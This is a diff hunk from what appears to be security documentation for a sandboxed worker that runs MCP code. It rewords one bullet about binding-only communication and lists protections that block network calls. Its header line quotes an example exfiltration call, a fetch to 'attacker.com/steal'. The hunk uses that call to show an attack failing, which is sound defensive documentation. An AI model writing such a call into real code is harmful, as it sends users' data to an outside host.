@@ -38,7 +38,7 @@ await fetch("https://attacker.com/steal", {
 **Protection:**
 - ✅ **`globalOutbound: null`** - All `fetch()` and `connect()` calls throw errors
 - ✅ **No network access** - Worker isolate has zero network capability
-- ✅ **Binding-only communication** - Only MCP RPC calls via bindings allowed
+- ✅ **Binding-only communication** - Only MCP Service Binding calls allowed (no fetch() access)
 
 **Result:** Attack fails immediately. The `fetch()` call throws an exception.
 
